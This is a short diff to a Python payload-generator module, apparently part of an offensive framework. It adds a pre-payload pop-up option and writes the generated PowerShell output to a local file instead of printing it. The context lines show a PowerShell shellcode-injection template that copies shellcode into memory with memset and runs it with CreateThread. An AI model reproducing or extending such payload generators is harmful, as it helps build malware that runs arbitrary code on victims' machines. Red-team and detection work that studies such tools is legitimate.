@@ -45,6 +45,7 @@ class PayloadModule:
             "DOMAIN"         : ["X", "Optional: Required internal domain"],
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
             "USERNAME"       : ["X", "Optional: The required user account"],
+            "USERPROMPT"     : ["FALSE", "Window pops up prior to payload"],
             "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
@@ -97,7 +98,8 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($ct.ToInt32()+$i), $s
 $z=$o::CreateThread(0,0,$ct,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)
 
         baseString += '}\n' * num_ends
-        print(baseString)
+        with open('/home/flynn/out.ps1', 'w') as dumb:
+            dumb.write(baseString)
         return baseString
 
     def generate(self):
